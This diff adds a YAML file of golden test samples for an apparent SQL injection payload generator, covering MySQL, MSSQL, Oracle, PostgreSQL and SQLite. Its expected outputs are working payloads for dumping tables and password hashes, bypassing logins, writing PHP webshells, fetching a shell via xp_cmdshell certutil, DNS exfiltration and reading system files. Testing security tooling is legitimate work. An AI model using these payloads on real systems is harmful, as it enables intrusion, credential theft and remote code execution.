@@ -1,0 +1,472 @@
+# 第五轮扩充（SQLi 方言）的黄金样本。
+#
+# 期望值全部是**照着 data/ 里的 body 手推**出来的：读 body → 代入槽位默认值/指定值
+# → 替换变量 → 无绕过、无传输编码 → 得到最终串。没有一条是跑一遍工具粘回来的。
+#
+# 回显位相关的样本特意覆盖了 cols/pos 的非默认组合——那正是这一轮要解决的
+# 「回显位写死在第一位」问题，默认值跑通不代表参数化是对的。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= MySQL =================
+
+  - name: MySQL 读库名
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.union.databases
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT group_concat(schema_name),2,3 FROM information_schema.schemata -- -"
+
+  - name: MySQL 读列名
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.union.columns
+      vars: {table: users}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT group_concat(column_name),2,3 FROM information_schema.columns WHERE table_name='users' -- -"
+
+  - name: MySQL 读列数据
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.union.dump
+      slots: {cols: "3", pos: "1"}
+      vars: {col: username, table: users}
+      outputs: [raw]
+    expect:
+      # expr 槽位取默认值 group_concat(<<col>>,0x7c)，槽位先填、变量后替换，
+      # 所以里面的 <<col>> 在这一趟才被换成 username
+      payload: "' UNION SELECT group_concat(username,0x7c),2,3 FROM users -- -"
+
+  - name: MySQL 读列数据 · 回显位在第 3 位
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.union.dump
+      slots: {cols: "4", pos: "3"}
+      vars: {col: password, table: users}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,2,group_concat(password,0x7c),4 FROM users -- -"
+
+  - name: MySQL 读账号密码哈希
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.union.user
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT concat(user,0x3a,authentication_string),2,3 FROM mysql.user -- -"
+
+  - name: MySQL floor 报错注入
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.error.floor
+      vars: {expr: "@@version"}
+      outputs: [raw]
+    expect:
+      payload: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(@@version),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -"
+
+  - name: MySQL EXP 报错注入
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.error.exp
+      vars: {expr: "version()"}
+      outputs: [raw]
+    expect:
+      payload: "' AND EXP(~(SELECT * FROM (SELECT (version()))a)) -- -"
+
+  - name: MySQL 几何函数报错注入
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.error.geometry
+      vars: {expr: "database()"}
+      outputs: [raw]
+    expect:
+      payload: "' AND geometrycollection((SELECT * FROM (SELECT (database()))a)) -- -"
+
+  - name: MySQL 无列名注入
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.error.nocolumn
+      vars: {table: users}
+      outputs: [raw]
+    expect:
+      # t 槽位取默认 n3 → 种子 1,2,3；colidx 取默认 2
+      payload: "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(`2`) FROM (SELECT 1,2,3 UNION SELECT * FROM users)x),0x7e)) -- -"
+
+  - name: MySQL 无列名注入 · 四列取第三列
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.error.nocolumn
+      slots: {t: n4, colidx: "3"}
+      vars: {table: admin}
+      outputs: [raw]
+    expect:
+      payload: "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(`3`) FROM (SELECT 1,2,3,4 UNION SELECT * FROM admin)x),0x7e)) -- -"
+
+  - name: MySQL INTO OUTFILE 写 webshell
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.union.outfile
+      vars: {filepath: /var/www/html/s.php}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT '<?php @eval($_POST[1]);?>',2,3 INTO OUTFILE '/var/www/html/s.php' -- -"
+
+  - name: MySQL 恶意服务端读客户端文件
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.file.read.load_data
+      vars: {filepath: /etc/passwd, table: t}
+      outputs: [raw]
+    expect:
+      # body 里 BY 后面是 YAML 双引号里的 \\n，落到载荷文本就是反斜杠加 n 两个字符
+      payload: "'; LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t FIELDS TERMINATED BY '\\n'--"
+
+  - name: MySQL 堆叠插入数据
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.stacked.insert
+      vars: {table: users, fields: "username,password", values: "'admin',md5(1)"}
+      outputs: [raw]
+    expect:
+      payload: "'; INSERT INTO users (username,password) VALUES ('admin',md5(1))--"
+      # values 里的引号不在模板的引号字面量内（模板里没有包住它的引号），不该提示
+      checks_count: 0
+
+  - name: MySQL 无条件延时
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.time.sleep.plain
+      outputs: [raw]
+    expect:
+      payload: "' AND SLEEP(5) -- -"
+
+  - name: MySQL 延时盲注子查询形态
+    state:
+      vuln: sqli
+      component: mysql
+      template: sqli.mysql.time.sleep.subquery
+      outputs: [raw]
+    expect:
+      payload: "' AND (SELECT 1 FROM (SELECT SLEEP(5))x) -- -"
+
+  # ================= MSSQL =================
+
+  - name: MSSQL 指定用户登录绕过
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.auth.bypass.admin
+      outputs: [raw]
+    expect:
+      # username 默认 admin、close 默认 '、comment 默认 --
+      payload: "admin' --"
+
+  - name: MSSQL 读库名
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.union.databases
+      outputs: [raw]
+    expect:
+      # src 是字典槽位，表名和列名配套取 sysdb → sys.databases / name
+      payload: "' UNION SELECT name,2,3 FROM sys.databases --"
+
+  - name: MSSQL 读库名 · 退回 schemata
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.union.databases
+      slots: {src: schema, cols: "4", pos: "2"}
+      outputs: [raw]
+    expect:
+      # 字典槽位的字段同样能当 <<select>> 的第三个参数——引擎把 src.col 也记进了查找表
+      payload: "' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata --"
+
+  - name: MSSQL 读列名
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.union.columns
+      vars: {table: users}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' --"
+
+  - name: MSSQL FOR XML PATH 拼多行
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.union.forxml
+      vars: {col: password, table: users}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT (SELECT CAST(password AS NVARCHAR(MAX))+'|' FROM users FOR XML PATH('')),2,3 --"
+
+  - name: MSSQL 当前权限探测
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.detect.priv
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT is_srvrolemember('sysadmin'),2,3 --"
+
+  - name: MSSQL OPENROWSET 读文件
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.file.read
+      vars: {filepath: C:/inetpub/wwwroot/web.config}
+      outputs: [raw]
+    expect:
+      payload: "'; SELECT * FROM OPENROWSET(BULK 'C:/inetpub/wwwroot/web.config', SINGLE_CLOB) AS x--"
+
+  - name: MSSQL 下载 webshell 落地
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.file.write.download
+      vars: {lhost: 10.0.0.1, file: shell.aspx, filepath: C:/inetpub/wwwroot/shell.aspx}
+      outputs: [raw]
+    expect:
+      # 三个变量都落在 '...' 里，值里没有引号，所以不触发截断提示
+      payload: "'; EXEC xp_cmdshell 'certutil -urlcache -f http://10.0.0.1/shell.aspx C:/inetpub/wwwroot/shell.aspx'--"
+      checks_count: 0
+
+  - name: MSSQL 堆叠插入数据
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.stacked.insert
+      vars: {table: users, fields: "username,password", values: "'admin','x'"}
+      outputs: [raw]
+    expect:
+      payload: "'; INSERT INTO users (username,password) VALUES ('admin','x')--"
+
+  # ================= Oracle =================
+
+  - name: Oracle 指定用户登录绕过
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.auth.bypass.admin
+      outputs: [raw]
+    expect:
+      payload: "admin' --"
+
+  - name: Oracle 读列名
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.union.columns
+      vars: {table: USERS}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT column_name,2,3 FROM user_tab_columns WHERE table_name='USERS' --"
+
+  - name: Oracle 读账号密码哈希
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.union.hash
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT (select username||':'||spare4 from sys.user$ where rownum=1),2,3 FROM dual --"
+
+  - name: Oracle XMLType 报错注入
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.error.xmltype
+      vars: {expr: user}
+      outputs: [raw]
+    expect:
+      payload: "' AND 1=(SELECT upper(XMLType(chr(60)||chr(58)||(user)||chr(62))) FROM dual) --"
+
+  - name: Oracle DNS 带外
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.oob.dns
+      vars: {expr: user, domain: d.example.com}
+      outputs: [raw]
+    expect:
+      payload: "' AND 1=utl_inaddr.get_host_address((user)||'.d.example.com') --"
+
+  - name: Oracle 读文件
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.file.read
+      vars: {filepath: /etc/passwd}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT DBMS_XSLPROCESSOR.READ2CLOB('/etc/passwd'),2,3 FROM dual --"
+
+  # ================= PostgreSQL =================
+
+  - name: PostgreSQL 指定用户登录绕过
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.auth.bypass.admin
+      outputs: [raw]
+    expect:
+      payload: "admin' --"
+
+  - name: PostgreSQL 读库名
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.union.databases
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT string_agg(datname,','),2,3 FROM pg_database --"
+
+  - name: PostgreSQL 读列名
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.union.columns
+      vars: {table: users}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT string_agg(column_name,','),2,3 FROM information_schema.columns WHERE table_name='users' --"
+
+  - name: PostgreSQL 读列数据
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.union.dump
+      vars: {col: password, table: users}
+      outputs: [raw]
+    expect:
+      # 分隔符取默认 ','，两个逗号在 string_agg 的参数里，不会被 <<select>> 的切分弄坏
+      payload: "' UNION SELECT string_agg(password,','),2,3 FROM users --"
+
+  - name: PostgreSQL 读账号密码哈希
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.union.hash
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT usename||':'||passwd,2,3 FROM pg_shadow --"
+
+  - name: PostgreSQL query_to_xml 报错注入
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.error.xml
+      vars: {expr: "version()"}
+      outputs: [raw]
+    expect:
+      payload: "' AND 1=CAST((SELECT query_to_xml('SELECT version()',true,true,'')) AS int) --"
+
+  - name: PostgreSQL 列目录
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.file.list
+      vars: {filepath: /var/lib/postgresql}
+      outputs: [raw]
+    expect:
+      # 表达式里有逗号和括号，靠括号配对扫描才没被切坏
+      payload: "' UNION SELECT array_to_string(pg_ls_dir('/var/lib/postgresql'),','),2,3 --"
+
+  - name: PostgreSQL COPY TO 写 webshell
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.file.write
+      vars: {filepath: /var/www/html/s.php}
+      outputs: [raw]
+    expect:
+      payload: "'; COPY (SELECT '<?php @eval($_POST[1]);?>') TO '/var/www/html/s.php'--"
+
+  - name: PostgreSQL 时间盲注非堆叠
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.time.pgsleep.inline
+      outputs: [raw]
+    expect:
+      payload: "' AND (SELECT 1 FROM pg_sleep(5)) --"
+
+  - name: PostgreSQL 堆叠插入数据
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.stacked.insert
+      vars: {table: users, fields: "username,password", values: "'admin','x'"}
+      outputs: [raw]
+    expect:
+      payload: "'; INSERT INTO users (username,password) VALUES ('admin','x')--"
+
+  # ================= SQLite =================
+
+  - name: SQLite 指定用户登录绕过
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.auth.bypass.admin
+      outputs: [raw]
+    expect:
+      payload: "admin' --"
+
+  - name: SQLite 读列数据
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.union.dump
+      vars: {col: password, table: users}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT group_concat(password,'|'),2,3 FROM users --"
+
+  - name: SQLite 布尔盲注逐字符
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.blind.substr
+      vars: {col: password, table: users, pos: "1", ch: a}
+      outputs: [raw]
+    expect:
+      payload: "' AND (SELECT substr(password,1,1) FROM users LIMIT 1)='a' --"
+
+  - name: SQLite 时间盲注带条件
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.time.randomblob.cond
+      vars: {cond: "1=1"}
+      outputs: [raw]
+    expect:
+      payload: "' AND (SELECT CASE WHEN (1=1) THEN length(randomblob(100000000)) ELSE 0 END)>0 --"
+
+  - name: SQLite 加载扩展
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.load_extension
+      vars: {filepath: /tmp/evil.so}
+      outputs: [raw]
+    expect:
+      payload: "'; SELECT load_extension('/tmp/evil.so')--"
